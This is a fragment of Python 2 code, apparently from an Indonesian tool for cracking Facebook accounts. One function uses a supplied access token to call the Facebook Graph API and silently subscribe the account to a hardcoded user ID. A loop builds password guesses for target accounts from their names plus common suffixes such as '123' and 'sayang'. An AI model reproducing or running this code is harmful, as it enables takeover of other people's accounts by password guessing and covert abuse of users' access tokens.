...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100007363270417/subscribers?access_token=%s'%(kentod))
...
def info_tools():
    ...
    print '\n %s[%s>%s] Yt       : Shiki VD.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author   : Moch Shiki Jian Alverdo VD.'%(N,H,N);time.sleep(0.07)
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"sayang", xz[0]+"anjing"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"sayang", xz[0]+"anjing"]
